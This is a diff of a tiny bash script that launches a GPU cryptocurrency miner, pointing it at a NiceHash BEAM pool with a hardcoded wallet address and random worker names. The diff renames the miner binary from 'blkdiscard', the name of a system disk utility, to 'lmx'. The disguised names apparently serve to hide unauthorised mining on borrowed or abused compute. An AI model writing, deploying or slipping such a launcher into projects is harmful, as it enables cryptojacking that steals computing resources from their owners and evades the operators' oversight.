@@ -1,4 +1,4 @@
 #!/bin/bash
 
-chmod +x blkdiscard
-./blkdiscard --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387  --user 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(echo GPU-MINJEM-$(shuf -i 1000-9999 -n 1)) --ethstratum ETHPROXY
+chmod +x lmx
+./lmx --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387  --user 36wHKR1dKTuoxLEs1yxdtQFJjoDc85neq3.$(echo GPU-MINJEM-$(shuf -i 1000-9999 -n 1)) --ethstratum ETHPROXY
